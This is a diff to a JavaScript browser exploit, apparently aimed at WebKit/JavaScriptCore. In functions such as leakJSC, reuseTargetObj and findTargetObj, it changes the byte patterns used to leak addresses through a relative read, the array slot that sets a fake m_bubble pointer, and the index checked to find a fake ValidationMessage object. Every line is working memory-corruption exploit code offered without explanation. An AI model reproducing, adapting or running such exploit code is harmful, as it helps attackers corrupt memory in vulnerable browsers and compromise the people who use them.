@@ -264,9 +264,9 @@ function leakJSC() {
 					g_relative_read.charCodeAt(i + 0x3f) === 0x00)
 					v = new Int64(str2array(g_relative_read, 8, i + 0x20));
 				else if (g_relative_read.charCodeAt(i + 0x10) === 0x42 &&
+					g_relative_read.charCodeAt(i + 0x11) === 0x42 &&
 					g_relative_read.charCodeAt(i + 0x12) === 0x42 &&
-					g_relative_read.charCodeAt(i + 0x13) === 0x42 &&
-					g_relative_read.charCodeAt(i + 0x14) === 0x42)
+					g_relative_read.charCodeAt(i + 0x13) === 0x42)
 					v = new Int64(str2array(g_relative_read, 8, i + 8));
 			}
 			if (v !== undefined && v.greater(g_timer_leak) && v.sub(g_timer_leak).hi32() === 0x0) {
@@ -333,7 +333,7 @@ function reuseTargetObj() {
 		let view = new Float64Array(ab);
 
 		view[0] = guess_htmltextarea_addr.asDouble();   // m_element
-		view[3] = guess_htmltextarea_addr.asDouble();   // m_bubble
+		view[4] = guess_htmltextarea_addr.asDouble();   // m_bubble
 
 		g_arr_ab_1.push(view);
 	}
@@ -363,7 +363,7 @@ function dumpTargetObj() {
 
 function findTargetObj() {
 	for (let i = 0; i < g_arr_ab_1.length; i++) {
-		if (!Int64.fromDouble(g_arr_ab_1[i][2]).equals(Int64.Zero)) {
+		if (!Int64.fromDouble(g_arr_ab_1[i][3]).equals(Int64.Zero)) {
 			debug_log("[+] Found fake ValidationMessage");
 
 			if (g_round === 2) {
